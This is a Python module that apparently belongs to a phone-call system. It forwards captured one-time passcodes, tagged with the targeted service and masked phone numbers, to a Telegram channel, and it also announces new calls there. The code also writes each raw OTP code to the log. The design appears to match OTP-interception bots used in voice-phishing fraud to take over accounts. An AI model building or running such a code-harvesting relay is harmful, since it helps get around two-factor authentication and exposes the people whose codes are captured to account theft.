from telegram import Bot
import os
import logging
from typing import Optional

logger = logging.getLogger(__name__)

class TelegramService:
    def __init__(self):
        self.bot_token = os.getenv('TELEGRAM_BOT_TOKEN')
        self.channel_id = os.getenv('TELEGRAM_CHANNEL_ID')
        self.bot = Bot(token=self.bot_token)
    
    async def send_otp_to_channel(self, otp_code: str, call_id: str, user_email: str, call_data: dict = None):
        """Send OTP code to Telegram channel with formatted message"""
        try:
            # Mask phone numbers for privacy (show first 5 and last 2 digits)
            def mask_phone(phone):
                if not phone or len(phone) < 7:
                    return phone
                return f"{phone[:5]}{'x' * (len(phone) - 7)}{phone[-2:]}"
            
            # Get call details
            service = call_data.get('service_name', 'Unknown Service') if call_data else 'Unknown Service'
            from_number = call_data.get('from_number', 'Unknown') if call_data else 'Unknown'
            to_number = call_data.get('to_number', 'Unknown') if call_data else 'Unknown'
            
            # Mask numbers
            from_masked = mask_phone(from_number)
            to_masked = mask_phone(to_number)
            
            # Get user identifier (first letter + masked email)
            user_display = user_email[0].upper() + 'x' * 6 + 't' if user_email else 'Unknown'
            
            message = f"""🔐 *OTP Received*

🎯 *Service:* {service}
📞 *From:* {from_masked}
📱 *To:* {to_masked}
🔢 *Code:* {otp_code}
👤 *By:* {user_display}
            """
            
            await self.bot.send_message(
                chat_id=self.channel_id,
                text=message,
                parse_mode='Markdown'
            )
            
            logger.info(f"✅ OTP {otp_code} forwarded to Telegram for service: {service}")
            return True
        except Exception as e:
            logger.error(f"Error sending to Telegram: {e}")
            return False
    
    async def send_call_notification(self, call_data: dict):
        """Send call start notification to channel"""
        try:
            message = f"""
📞 **New Call Initiated**

**From:** {call_data.get('from_number')}
**To:** {call_data.get('to_number')}
**Service:** {call_data.get('service_name')}
**Type:** {call_data.get('call_type').upper()}
**Call ID:** `{call_data.get('call_id')}`
            """
            
            await self.bot.send_message(
                chat_id=self.channel_id,
                text=message,
                parse_mode='Markdown'
            )
            return True
        except Exception as e:
            logger.error(f"Error sending call notification: {e}")
            return False
    
    def _get_current_time(self):
        from datetime import datetime
        return datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')